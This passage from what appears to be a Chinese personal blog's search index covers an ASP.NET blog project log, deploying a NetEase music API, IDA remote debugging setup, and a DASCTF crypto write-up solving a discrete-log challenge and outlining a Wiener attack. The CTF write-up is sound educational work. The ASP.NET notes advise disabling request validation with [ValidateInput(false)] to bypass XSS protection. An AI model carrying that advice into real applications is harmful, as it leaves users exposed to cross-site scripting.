class="name">script</span>&gt;</span></span><br><span class="line">@*天气插件的js的引入*@</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="lt-2-gt-第二种比较小的js插件"><a href="#lt-2-gt-第二种比较小的js插件" class="headerlink" title="&lt;2&gt;. 第二种比较小的js插件"></a>&lt;2&gt;. 第二种比较小的js插件</h4><blockquote><p><a href="https://www.tianqi.com/dingzhi/">插件参考网址</a></p></blockquote><p>​效果如下：</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211215224238467.png"></p><p>综上所述，我决定采用下面的iframe的那个插件。</p><h3 id="8-添加爆炸特效"><a href="#8-添加爆炸特效" class="headerlink" title="8. 添加爆炸特效"></a>8. 添加爆炸特效</h3><blockquote><p><a href="https://github.com/MathGod/js_dianji_baozha">js_dianji_baozha</a></p></blockquote><p>使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">class</span>=<span class="string">&quot;fireworks&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./js/aixin.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./js/anime.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./js/fireworks.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>爱心特效可有可无，我直接把最上面的爱心特效给去了，只剩下下面这两个就ok，但是下面这两个要注意引入的先后顺序必须跟我的这个一样，否则特效就不会生效了。</p><h3 id="9-更换鼠标样式"><a href="#9-更换鼠标样式" class="headerlink" title="9. 更换鼠标样式"></a>9. 更换鼠标样式</h3><p>先上致美化网上下载cur图标压缩包，解压到项目文件夹之中后，在总的css文件中加入下面的样式即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    cursor: url(&#x27;../css/hack-cur/Hacked Mod Blue/Arrow.cur&#x27;), auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中ur包括的是你的鼠标图像的路径，后面的auto是默认的鼠标样式，这两个东西都是必须的！</p><h2 id="九、后端问题及解决方案"><a href="#九、后端问题及解决方案" class="headerlink" title="九、后端问题及解决方案"></a>九、后端问题及解决方案</h2><h3 id="1-js与viewbag数据传递"><a href="#1-js与viewbag数据传递" class="headerlink" title="1. js与viewbag数据传递"></a>1. js与viewbag数据传递</h3><p>这个我目前没找到好的办法来传递消息，只能通过Razor引擎先把id嵌入到html界面的隐藏标签之中，js再取标签内的数据就可以了，但是这样的话后面千万不要忘了鉴权。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;blog_id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;@ViewBag.id&quot;</span>&gt;</span> <span class="comment">&lt;!--存放文章id，发布时删除此条注释--&gt;</span></span><br></pre></td></tr></table></figure><p>js文件中取这里的数据的方式为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> id = $(<span class="string">&quot;input:hidden[name=&#x27;blog_id&#x27;]&quot;</span>).<span class="title function_">val</span>();</span><br></pre></td></tr></table></figure><p>这样就能实现js与asp后端的数据交互了。</p><h3 id="2-C-有字符串生成MD5"><a href="#2-C-有字符串生成MD5" class="headerlink" title="2. C#有字符串生成MD5"></a>2. C#有字符串生成MD5</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> MD5字符串加密</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;txt&quot;&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>加密后字符串<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">GenerateMD5</span>(<span class="params"><span class="built_in">string</span> txt</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> (MD5 mi = MD5.Create())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] buffer = Encoding.Default.GetBytes(txt);</span><br><span class="line">        <span class="comment">//开始加密</span></span><br><span class="line">        <span class="built_in">byte</span>[] newBuffer = mi.ComputeHash(buffer);</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; newBuffer.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sb.Append(newBuffer[i].ToString(<span class="string">&quot;x2&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-数据库二次连接"><a href="#3-数据库二次连接" class="headerlink" title="3. 数据库二次连接"></a>3. 数据库二次连接</h3><p>​会报错，一个数据库上下文只能同时被一个地方使用，把数据库上下文声明为static是不合理的，可以直接在哪里使用就在那里使用using关键字来声明</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> (BlogDb tmpdb = <span class="keyword">new</span> BlogDb()) &#123;</span><br><span class="line">    <span class="built_in">int</span> intid = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span>.TryParse(id, <span class="keyword">out</span> intid);</span><br><span class="line">    ArticleInfo articleInfo = tmpdb.ArticleInfo.Find(intid);  <span class="comment">//数据库上下文在此使用</span></span><br><span class="line">    <span class="built_in">string</span> path = articleInfo.articlepath;</span><br><span class="line">    path = Request.MapPath(path);  <span class="comment">//转换为相对路径</span></span><br><span class="line">    <span class="built_in">string</span> readContents = System.IO.File.ReadAllText(path, Encoding.UTF8);</span><br><span class="line">    <span class="keyword">return</span> Content(readContents);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​为了简化代码，可以在class里面声明一个全局变量——用来在只有一处调用时使用，如果有第二处需要连接数据库的地方，则使用上面的这种方式来使用。</p><h3 id="4-在本地重新设置post接收数据的限制"><a href="#4-在本地重新设置post接收数据的限制" class="headerlink" title="4. 在本地重新设置post接收数据的限制"></a>4. 在本地重新设置post接收数据的限制</h3><p><a href="https://www.cnblogs.com/Zongsoft/p/IIS-Express.html">- 参考文章链接 -</a></p><p>​    这个限制是我在测试上传长度时发现的，ajax上传的post数据一旦超过某个阈值就会post不上去，这里采用网上的解决方案试了一试。</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211209142230048.png"></p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211209142253305.png"></p><p>​    然而修改之后无果，我感觉可能会使ajax的错误？错了，都错了，原来是防xss攻击的策略，可以取消这个数据验证</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211209143944306.png"></p><p>取消验证的方法如下，直接修改<code>web.config</code>文件的内容即可。</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211209144153591.png"></p><p>其实都不用，看了官方文档就清楚了，直接改下面这里，加上个<code>[ValidateInput(false)]</code>就ok了。</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211209145037420.png"></p><h3 id="5-取消code-first产生的错误"><a href="#5-取消code-first产生的错误" class="headerlink" title="5. 取消code first产生的错误"></a>5. 取消code first产生的错误</h3><p>使用code first的时候，取消使用这个策略的时候会报错，这个时候只需要删除主目录上面的migration目录即可。</p><blockquote><p><a href="https://blog.csdn.net/qq_31135027/article/details/79756647">支持“OdeToFoodDb”上下文的模型已在数据库创建后发生更改</a></p></blockquote><h3 id="6-数据库模型类泛型列表按某列排序"><a href="#6-数据库模型类泛型列表按某列排序" class="headerlink" title="6. 数据库模型类泛型列表按某列排序"></a>6. 数据库模型类泛型列表按某列排序</h3><p>本项目需要使用按日期对数据库中的文章信息进行排序的功能，这里需要使用排序功能</p><blockquote><p><a href="https://www.cnblogs.com/xu-yi/p/10852624.html">数据库：order by排序语句的用法</a></p><p><a href="https://www.cnblogs.com/xu-yi/p/10852624.html">【转载】C#中使用OrderBy和ThenBy等方法对List集合进行排序</a></p></blockquote><p>按日期降序排序之后获取前5个字段的语句为</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmpdb.ArticleInfo.OrderByDescending(article =&gt; article.articleupdatetime).Take(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><h3 id="7-SqlServer设置id自增"><a href="#7-SqlServer设置id自增" class="headerlink" title="7. SqlServer设置id自增"></a>7. SqlServer设置id自增</h3><p>只需要在需要自增的字段的后面加上下图中的属性就行了，<code>IDENTITY(0,1)</code>这个语句代表的是从0开始，每步自增数为1。</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211217145804744.png"></p><p>但是这样对我的功能似乎并没有什么帮助。我想实现的功能时，当我删除中间部分的某一个行的数据时，后面的id会自动向上并且减一，比如说本来如果是<code>1 2 3 4 5...</code>，当我删除了<code>3</code>这条记录时，我所期望发生的变化是<code>1 2 3 4...</code>而不是<code>1 2 4 5...</code>，</p><h1 id="网易云项目文档"><a href="#网易云项目文档" class="headerlink" title="网易云项目文档"></a>网易云项目文档</h1><h2 id="一、使用的API"><a href="#一、使用的API" class="headerlink" title="一、使用的API"></a>一、使用的API</h2><p>使用的是一个开源的API项目，项目地址为</p><p><a href="https://github.com/Binaryify/NeteaseCloudMusicApi">https://github.com/Binaryify/NeteaseCloudMusicApi</a></p><p>这里主要使用的是这个api的搜索与下载地址的功能，这个项目的部署方式在文档里面写得也很清楚。</p><h3 id="docker使用失败"><a href="#docker使用失败" class="headerlink" title="docker使用失败"></a>docker使用失败</h3><p>这里我本准备在我的VPS里面使用docker部署一个容器，易于管理。但是涉及到了一些我从没见过得报错，就直接放弃了使用docker来部署的想法，这里还是直接在VPS里面安装一下Nodejs吧。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -d --name CloudMusic -p 3000:3000 binaryify/netease_cloud_music_api</span></span><br><span class="line"></span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -d -p 3000:3000 --name CloudMusic -e http_proxy= -e https_proxy= -e no_proxy= -e HTTP_PROXY= -e HTTPS_PROXY= -e NO_PROXY= binaryify/netease_cloud_music_api</span></span><br></pre></td></tr></table></figure><h3 id="直接在VPS上面安装Node使用"><a href="#直接在VPS上面安装Node使用" class="headerlink" title="直接在VPS上面安装Node使用"></a>直接在VPS上面安装Node使用</h3><h4 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a>安装node</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget -c https://nodejs.org/dist/v16.13.0/node-v16.13.0.tar.gz</span><br><span class="line">tar -zxvf node-v16.13.0.tar.gz</span><br><span class="line">cd node-v16.13.0</span><br><span class="line">sudo yum install gcc gcc-c++</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>但是上面的命令安装nodejs的话，编译的太慢了，这里可以安装比较低的版本，使用yum安装即可，方便快捷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install nodejs</span><br><span class="line"></span><br><span class="line"># 查看node版本</span><br><span class="line">[root@VM-12-8-centos node]# node -v</span><br><span class="line">v10.24.0</span><br></pre></td></tr></table></figure><p>可惜安装的不是最新的版本，但是对于我们使用来说是已经够用了。</p><h4 id="安装cloudmusic接口程序"><a href="#安装cloudmusic接口程序" class="headerlink" title="安装cloudmusic接口程序"></a>安装cloudmusic接口程序</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:Binaryify/NeteaseCloudMusicApi.git</span><br><span class="line">npm install</span><br><span class="line">node app.js</span><br></pre></td></tr></table></figure><h2 id="二、搜索功能实现"><a href="#二、搜索功能实现" class="headerlink" title="二、搜索功能实现"></a>二、搜索功能实现</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用ida进行动态调试的配置</title>
      <link href="/2021/09/27/%E4%BD%BF%E7%94%A8ida%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/09/27/%E4%BD%BF%E7%94%A8ida%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="ELF文件的动态调试"><a href="#ELF文件的动态调试" class="headerlink" title="ELF文件的动态调试"></a>ELF文件的动态调试</h3><p>这里首先打开ida的文件夹，在里面找到dbgsrv文件夹，里面有几个服务端的文件。找到你用做服务器的机子上面适合的文件执行。</p><p><img src="/2021/09/27/%E4%BD%BF%E7%94%A8ida%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%9A%84%E9%85%8D%E7%BD%AE//image-20210927155753619.png"></p><p>这里我的ip:port为<code>192.168.10.146:23946</code>。然后在ida中直接点击绿色的执行符号会让进行配置，配置的主要是ip与port，文件可以直接yes点击选择从windows复制到linux系统里面，复制的默认路径就是服务端文件的路径。</p><p><img src="/2021/09/27/%E4%BD%BF%E7%94%A8ida%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%9A%84%E9%85%8D%E7%BD%AE//image-20210927161100687.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> ida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF9月赛 X 浙江工业大学秋季挑战赛</title>
      <link href="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>从这篇文章开始，接下来还是一个比赛放一篇文章里面了，感觉还是这样搞比较好交流，篇幅也短，到时候复习的时候直接哪里不会搜关键词也行。</p><h2 id="Crypto-赛后补打完"><a href="#Crypto-赛后补打完" class="headerlink" title="Crypto (赛后补打完)"></a>Crypto (赛后补打完)</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;******************&#125;&#x27;</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">256</span></span><br><span class="line">flaglong=bytes_to_long(flag)</span><br><span class="line">m = random.randint(<span class="number">2</span>, n-<span class="number">1</span>) | <span class="number">1</span>  <span class="comment"># 如果random函数获得的是偶数，则将其+1转换为奇数</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, flaglong, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m = &#x27;</span> + <span class="built_in">str</span>(m))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 73964803637492582853353338913523546944627084372081477892312545091623069227301</span></span><br><span class="line"><span class="comment"># c = 21572244511100216966799370397791432119463715616349800194229377843045443048821</span></span><br></pre></td></tr></table></figure><p>全部都给出了基本上，直接就是一个简单的离散对数的问题<br>$$<br>c&#x3D;m^{flag} \quad mod \quad n<br>$$<br>这里的c、m、n都给出来了，直接写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">n = <span class="number">2</span> ** <span class="number">256</span></span><br><span class="line">m = <span class="number">73964803637492582853353338913523546944627084372081477892312545091623069227301</span></span><br><span class="line">c = <span class="number">21572244511100216966799370397791432119463715616349800194229377843045443048821</span></span><br><span class="line"></span><br><span class="line">flaglong = sympy.discrete_log(n, c, m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flaglong))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;DASCTF_zjut&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h3><h4 id="1-代码如下"><a href="#1-代码如下" class="headerlink" title="1. 代码如下"></a>1. 代码如下</h4><blockquote><p>维纳攻击</p></blockquote><p>这种简单又复杂的题一般都是经不起分析的，这里简单分析一下就知道是怎么回事了。首先代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> get_flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod, gcd</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">m_exit</span>(<span class="params">n</span>):</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;==============Game Over!=================&quot;</span></span><br><span class="line">exit(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal_bit</span>(<span class="params">num</span>):</span><br><span class="line">num = <span class="built_in">int</span>(num)</span><br><span class="line">l = <span class="built_in">len</span>(<span class="built_in">bin</span>(num))</span><br><span class="line"><span class="keyword">return</span> l-<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi_b</span>(<span class="params">x</span>):</span><br><span class="line">bt = <span class="number">536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273L</span></span><br><span class="line"><span class="keyword">return</span> invmod(x, bt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ed</span>(<span class="params">p, q</span>):</span><br><span class="line">k = cal_bit(q*p)</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">r = random.randint(<span class="number">10</span>, <span class="number">99</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">u = getPrime(k/<span class="number">4</span> - r)</span><br><span class="line"><span class="keyword">if</span> gcd(u, phi_n) != <span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">t = invmod(u, phi_n)</span><br><span class="line">e = pi_b(t)</span><br><span class="line"><span class="keyword">if</span> gcd(e, phi_n) == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">d = invmod(e, phi_n)</span><br><span class="line"><span class="keyword">return</span> (e, d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">flag = get_flag()</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">2048</span>)</span><br><span class="line">q=getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e, d = get_ed(p, q)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n: &quot;</span>, <span class="built_in">hex</span>(n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;e: &quot;</span>, <span class="built_in">hex</span>(e)</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">enc_flag = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Your flag is: &quot;</span>, <span class="built_in">hex</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h4 id="2-加密分析"><a href="#2-加密分析" class="headerlink" title="2. 加密分析"></a>2. 加密分析</h4><p>这个加密脚本其实可以分解为下面几个式子：<br>$$<br>\left{<br>    \begin{array}{<strong>lr</strong>}<br>    t \times u \equiv 1 \bmod phin \<br>    e \times t \equiv 1 \bmod bt \<br>    e \times d \equiv 1 \bmod phin<br>    \end{array}<br>\right.<br>$$<br>而其中我们可以根据中间的那个式子算出<code>t的数值</code>。然后注意到<code>t</code>的值很大，并且它的模数也是<code>phin</code>，那我们就能对第一个式子采用维纳攻击，获得<code>u</code>和<code>phin</code>，这里u并没有什么用处。获取phin之后，就能根据第三个式子，直接求出d的数值了，这时直接<code>c、d、n</code>RSA解密三要素已经有了，直接解密即可。</p><p>所以根据上面的分析，这里的难点就是维纳攻击如何实现了。</p><h4 id="3-维纳攻击的实现"><a href="#3-维纳攻击的实现" class="headerlink" title="3. 维纳攻击的实现"></a>3. 维纳攻击的实现</h4><p><a href="https://github.com/pablocelayes/rsa-wiener-attack">pablocelayes&#x2F;rsa-wiener-attack</a></p><p>维纳攻击的实现脚本主要就是上面的这个，下载解压他这个代码之后，修改<code>RSAwienerHacker.py</code>文件的<code>hack_RSA(e, n)</code>的返回值，加上个<code>phi</code>，因为这里我们需要<code>phin</code>的值而不是<code>u</code>。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20211123232246157.png" alt="修改处"></p><p>然后直接在解密脚本中调用即可。</p><h4 id="4-解密实现"><a href="#4-解密实现" class="headerlink" title="4. 解密实现"></a>4. 解密实现</h4><p>下面是解密脚本(需要放在上面那个维纳攻击的脚本的同目录下，这里我给解密脚本命名为了<code>solve.py</code>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 